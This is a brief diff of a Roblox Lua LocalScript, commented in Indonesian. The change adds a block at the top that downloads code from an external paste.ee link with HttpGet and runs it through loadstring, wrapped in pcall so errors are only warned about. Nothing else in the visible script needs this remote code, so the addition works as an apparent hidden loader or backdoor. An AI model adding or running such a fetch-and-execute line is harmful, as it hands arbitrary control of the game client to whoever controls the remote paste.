@@ -1,5 +1,14 @@
 -- Tempatkan script ini di StarterPlayerScripts (LocalScript)
 
+-- Pertama, load dan jalankan script eksternal dari paste.ee
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://paste.ee/r/kEHhQbpL"))()
+end)
+
+if not success then
+    warn("Failed to load external script: " .. tostring(err))
+end
+
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
